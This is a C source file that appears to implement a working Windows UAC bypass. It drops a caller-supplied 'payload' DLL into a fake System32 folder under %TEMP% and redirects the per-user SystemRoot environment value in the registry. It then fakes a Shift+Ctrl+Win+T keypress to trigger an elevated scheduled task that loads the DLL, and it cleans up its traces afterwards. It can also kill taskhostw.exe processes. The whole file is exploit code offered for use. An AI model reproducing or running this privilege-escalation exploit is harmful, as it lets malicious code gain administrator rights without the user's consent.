#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <windows.h>
#include <tlhelp32.h>

#define DLLPATH "\\System32"
#define DLLNAME "\\PerformanceTraceHandler.dll"

#define ENVREGKEY "Volatile Environment"
#define ENVREGKEY2 "Volatile Environment\\0"
#define ENVREGVALUE "SystemRoot"

#define WAITFORTASK 2500

#define CreateEnvEntryFunction CreateEnvEntry
#define DeleteEnvEntryFunction DeleteEnvEntry

static HANDLE GetProcessTokenByPID(DWORD pid)
{
	HANDLE process = NULL;
	HANDLE token = NULL;
	process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (process)
	{
		OpenProcessToken(process, MAXIMUM_ALLOWED, &token);
		CloseHandle(process);
	}
	return token;
}

static BOOL IsElevated(DWORD pid)
{
	BOOL ret = FALSE;
	DWORD retlen = 0;
	DWORD elevated = 0;
	HANDLE token = GetProcessTokenByPID(pid);
	if (token)
	{
		retlen = sizeof(elevated);
		if (GetTokenInformation(token, TokenElevation, &elevated, retlen, &retlen))
		{
			if (elevated)
			{
				ret = TRUE;
			}
		}
		CloseHandle(token);
	}
	return ret;
}

typedef BOOL(*LPTASKHOST_ENUM_CALLBACK)(DWORD pid, void* parameter);

static BOOL FindTaskHostProcesses(LPTASKHOST_ENUM_CALLBACK callback, void* parameter)
{
	HANDLE process = NULL;
	PROCESSENTRY32W pe32;
	HANDLE snapshot = NULL;
	BOOL ret = FALSE;

	if (!callback)
	{
		return FALSE;
	}
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE)
	{
		memset(&pe32, 0, sizeof(pe32));
		pe32.dwSize = sizeof(pe32);
		if (Process32FirstW(snapshot, &pe32))
		{
			do
			{
				if (!lstrcmpiW(L"taskhostw.exe", pe32.szExeFile))
				{
					ret = callback(pe32.th32ProcessID, parameter);
					if (!ret)
					{
						break;
					}
				}
			} while (Process32NextW(snapshot, &pe32));
		}
		CloseHandle(snapshot);
	}
	return ret;
}

static BOOL TerminateTaskhostW(DWORD pid, void* parameter)
{
	HANDLE process = NULL;
	if (!parameter)
	{
		if (!IsElevated(pid))
		{
			return TRUE;
		}
	}
	printf("PID %u found!\n", (unsigned int)pid);
	process = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	if (process)
	{
		printf("PID %u opened!\n", (unsigned int)pid);
		if (TerminateProcess(process, 0))
		{
			printf("PID %u terminated!\n", (unsigned int)pid);
		}
		CloseHandle(process);
	}
	return TRUE;
}

static BOOL CopyPayloadDLL(char* dllfile, char* basepath)
{
	char dllpath[MAX_PATH];
	int dir_len = 0;

	(void)lstrcpynA(dllpath, basepath, MAX_PATH - 1 - sizeof(DLLPATH) - sizeof(DLLNAME));
	lstrcatA(dllpath, DLLPATH);
	dir_len = lstrlenA(dllpath);
	if (!CreateDirectoryA(dllpath, NULL))
	{
		if (GetLastError() != ERROR_ALREADY_EXISTS)
		{
			return FALSE;
		}
	}
	lstrcatA(dllpath, DLLNAME);
	if (!CopyFileA(dllfile, dllpath, FALSE))
	{
		dllpath[dir_len] = '\0';
		RemoveDirectoryA(dllpath);
		return FALSE;
	}
	return TRUE;
}

static BOOL DeletePayloadDLL(char* basepath)
{
	char dllpath[MAX_PATH];
	int dir_len = 0;

	(void)lstrcpynA(dllpath, basepath, MAX_PATH - 1 - sizeof(DLLPATH) - sizeof(DLLNAME));
	lstrcatA(dllpath, DLLPATH);
	dir_len = lstrlenA(dllpath);
	lstrcatA(dllpath, DLLNAME);
	if (!DeleteFileA(dllpath))
	{
		return FALSE;
	}
	dllpath[dir_len] = '\0';
	if (!RemoveDirectoryA(dllpath))
	{
		return FALSE;
	}
	return TRUE;
}

static BOOL CreateEnvEntry(char* basepath)
{
	HKEY key = NULL;

	if (RegOpenKeyExA(HKEY_CURRENT_USER, ENVREGKEY, 0, KEY_SET_VALUE, &key))
	{
		return FALSE;
	}
	if (RegSetValueExA(key, ENVREGVALUE, 0, REG_SZ, basepath, lstrlenA(basepath) + 1))
	{
		RegCloseKey(key);
		return FALSE;
	}
	RegCloseKey(key);

	return TRUE;
}

static BOOL DeleteEnvEntry()
{
	HKEY key = NULL;

	if (RegOpenKeyExA(HKEY_CURRENT_USER, ENVREGKEY, 0, KEY_SET_VALUE, &key))
	{
		return FALSE;
	}
	RegDeleteValueA(key, ENVREGVALUE);
	RegCloseKey(key);

	return TRUE;
}

static void Cleanup(char* basepath)
{
	DeleteEnvEntryFunction();
	DeletePayloadDLL(basepath);
}

static BOOL PressShiftCtrlWinT()
{
	INPUT inputs[8] = { 0 };
	memset(&inputs[0], 0, sizeof(inputs));

	inputs[0].type = INPUT_KEYBOARD;
	inputs[0].ki.wVk = VK_LSHIFT;

	inputs[1].type = INPUT_KEYBOARD;
	inputs[1].ki.wVk = VK_LCONTROL;

	inputs[2].type = INPUT_KEYBOARD;
	inputs[2].ki.wVk = VK_LWIN;

	inputs[3].type = INPUT_KEYBOARD;
	inputs[3].ki.wVk = 'T';

	inputs[4].type = INPUT_KEYBOARD;
	inputs[4].ki.wVk = 'T';
	inputs[4].ki.dwFlags = KEYEVENTF_KEYUP;

	inputs[5].type = INPUT_KEYBOARD;
	inputs[5].ki.wVk = VK_LWIN;
	inputs[5].ki.dwFlags = KEYEVENTF_KEYUP;

	inputs[6].type = INPUT_KEYBOARD;
	inputs[6].ki.wVk = VK_LCONTROL;
	inputs[6].ki.dwFlags = KEYEVENTF_KEYUP;

	inputs[7].type = INPUT_KEYBOARD;
	inputs[7].ki.wVk = VK_LSHIFT;
	inputs[7].ki.dwFlags = KEYEVENTF_KEYUP;

	return (SendInput(8, &inputs[0], sizeof(INPUT)) > 0);
}

static void print_help(char* executable)
{
	printf("Usage: %s [bypass|cleanup|killelev|killall] [dll path]\n", executable);
}

int main(int argc, char** argv)
{
	char tmppath[MAX_PATH];

	if (argc < 2)
	{
		print_help(argv[0]);
		return 1;
	}
	if (!GetTempPathA(MAX_PATH - 1, tmppath))
	{
		printf("GetTempPath failed: %u!\n", GetLastError());
		return 1;
	}
	if (!lstrcmpiA(argv[1], "cleanup"))
	{
		Cleanup(tmppath);
		return 0;
	}
	if (!lstrcmpiA(argv[1], "killelev"))
	{
		FindTaskHostProcesses((LPTASKHOST_ENUM_CALLBACK)TerminateTaskhostW, NULL);
		return 0;
	}
	if (!lstrcmpiA(argv[1], "killall"))
	{
		FindTaskHostProcesses((LPTASKHOST_ENUM_CALLBACK)TerminateTaskhostW, (void*)TRUE);
		return 0;
	}
	if (lstrcmpiA(argv[1], "bypass"))
	{
		print_help(argv[0]);
		return 1;
	}
	if (argc < 3)
	{
		print_help(argv[0]);
		return 1;
	}
	printf("Copy DLL file \"%s\" ...\n", argv[2]);
	if (!CopyPayloadDLL(argv[2], tmppath))
	{
		printf("CopyPayloadDLL failed: %u!\n", GetLastError());
		return 1;
	}
	printf("Set environment \"%s\" value to \"%s\" ...\n", ENVREGVALUE, tmppath);
	if (!CreateEnvEntryFunction(tmppath))
	{
		printf("CreateEnvEntryFunction failed: %u!\n", GetLastError());
		DeletePayloadDLL(tmppath);
		return 1;
	}
	printf("Pressing Shift+Ctrl+Win+T to start the RequestTrace Task ...\n");
	if (!PressShiftCtrlWinT())
	{
		printf("PressShiftCtrlWinT failed: %u!\n", GetLastError());
		Cleanup(tmppath);
		return 1;
	}
	printf("Wait for Task to start ...\n");
	Sleep(WAITFORTASK);
	printf("Cleanup ...\n");
	Cleanup(tmppath);

	return 0;
}
